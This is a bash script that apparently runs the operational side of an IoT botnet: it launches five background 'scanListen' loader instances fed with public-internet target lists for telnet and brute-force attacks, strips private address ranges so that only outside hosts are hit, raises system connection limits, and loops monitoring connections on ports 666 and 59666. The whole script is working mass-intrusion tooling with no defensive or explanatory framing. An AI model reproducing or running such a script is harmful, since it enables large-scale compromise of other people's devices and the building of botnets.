#!/bin/bash

# Simple multi-instance scanListen starter
echo "=== Starting Multiple scanListen Instances ==="

# Kill existing processes
pkill -f scanListen
sleep 2

# System optimizations
ulimit -n 999999
echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse
echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout

# Create clean target files (remove local network ranges)
echo "Creating clean target files..."
grep -v "^192\.168\." telnet.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > telnet_clean.txt
grep -v "^192\.168\." big.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > big_clean.txt
grep -v "^192\.168\." list.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > list_clean.txt

# Start instances one by one
echo "Starting instance 1 (telnet)..."
nohup ./scanListen loader1 < telnet_clean.txt > /dev/null 2>&1 &
sleep 2

echo "Starting instance 2 (big targets)..."
nohup ./scanListen loader2 < big_clean.txt > /dev/null 2>&1 &
sleep 2

echo "Starting instance 3 (list targets)..."
nohup ./scanListen loader3 < list_clean.txt > /dev/null 2>&1 &
sleep 2

echo "Starting instance 4 (brute force)..."
nohup ./scanListen loader4 < brute.txt > /dev/null 2>&1 &
sleep 2

echo "Starting instance 5 (enhanced targets)..."
grep -v "^192\.168\." enhanced_targets.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > enhanced_clean.txt
nohup ./scanListen loader5 < enhanced_clean.txt > /dev/null 2>&1 &
sleep 2

echo "=== All instances started ==="
echo "Checking running processes..."
ps aux | grep scanListen | grep -v grep

echo "Checking connections..."
ss -tn | grep -E "(666|59666)" | wc -l

# Monitor loop
while true; do
    sleep 30
    echo "=== Status Update ==="
    echo "Active processes: $(ps aux | grep scanListen | grep -v grep | wc -l)"
    echo "Active connections: $(ss -tn | grep -E "(666|59666)" | wc -l)"
    echo "===================="
done
